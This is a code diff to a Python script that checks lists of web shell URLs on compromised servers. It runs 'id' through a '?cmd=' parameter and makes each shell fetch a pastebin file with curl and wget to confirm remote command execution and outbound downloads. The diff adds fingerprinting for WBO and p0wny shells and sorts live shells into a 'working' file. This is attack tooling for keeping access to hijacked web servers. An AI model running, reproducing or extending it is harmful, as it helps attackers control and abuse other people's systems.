@@ -1,5 +1,6 @@
 import argparse
 import numbers
+import subprocess
 import sys
 import time
 import logging
@@ -55,6 +56,7 @@ def check_status_txt_file(path, verbose):
             bar.next()
             send_requests_and_check_responses(line, verbose)
     bar.finish()
+    subprocess.run(['touch', 'finished.txt'])
     txt_file.close()
 
 
@@ -68,6 +70,7 @@ def check_status_csv_file(path, verbose):
             bar.next()
             send_requests_and_check_responses(line, verbose)
     bar.finish()
+    subprocess.run(['touch', 'finished.txt'])
     csv_file.close()
 
 
@@ -81,6 +84,17 @@ def send_requests_and_check_responses(shell_url, verbose):
     cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
     # this command checks could file be downloaded and redirects output to stdout without saving it
     secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"
+
+    lebin_id = '#lebin'
+    reading_anchor = 'Read File'
+    group_anchor = 'Group'
+    permissions_anchor = 'Permissions'
+    change_directory_anchor = 'Change Directory'
+    owner_anchor = 'Owner'
+    ftop_anchor = 'ftop'
+
+    p0wny_shell_logo = "shell-logo"
+    p0wny_shell_content = "shell-content"
 
     file_with_working_shells = "working.txt"
     file_with_not_working_shells = "not_working.txt"
@@ -107,7 +121,17 @@ def send_requests_and_check_responses(shell_url, verbose):
                     contains_uid = response_text_id.find("uid")
                     contains_wget_file = secret_message in response_text_wget
                     contains_curl_file = secret_message in response_text_curl
-                    if contains_uid != -1 and contains_curl_file and contains_wget_file:
+                    # check for WBO
+                    response = session.get(shell_url, timeout=5, verify=False)
+                    is_wbo_shell = lebin_id in response.text and reading_anchor in response.text and \
+                        group_anchor in response.text and permissions_anchor in response.text and \
+                        change_directory_anchor in response.text and owner_anchor in response.text and \
+                        ftop_anchor in response.text
+                    # check for p0wny shell
+                    is_p0wny_shell = p0wny_shell_content in response.text and p0wny_shell_logo in response.text
+
+                    if contains_uid != -1 and contains_curl_file and contains_wget_file and not is_wbo_shell and \
+                            not is_p0wny_shell:
 
                         response_status = requests.get(shell_url + "?cmd=id").status_code
                         if verbose:
@@ -116,10 +140,21 @@ def send_requests_and_check_responses(shell_url, verbose):
                             print("All necessary commands works." + reset_ascii_color)
 
                         working_shells_file.write(f"{shell_url}\n")
-                    elif contains_uid != -1 or contains_curl_file or contains_wget_file:
+                    elif (contains_uid != -1 or contains_curl_file or contains_wget_file) and not is_wbo_shell and \
+                            not is_p0wny_shell:
                         if verbose:
                             print(ascii_red_color + "Probably not all commands working." + reset_ascii_color)
                         not_working_shells_file.write(f"{shell_url}\n")
+
+                    elif is_wbo_shell and not is_p0wny_shell:
+                        if verbose:
+                            print(ascii_red_color + "Maybe this is WBO shell?" + reset_ascii_color)
+                        working_shells_file.write(f"{shell_url}\n")
+
+                    elif is_p0wny_shell:
+                        if verbose:
+                            print(ascii_red_color + "Maybe this is p0wny shell?" + reset_ascii_color)
+                        working_shells_file.write(f"{shell_url}\n")
                     else:
                         if verbose:
                             print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
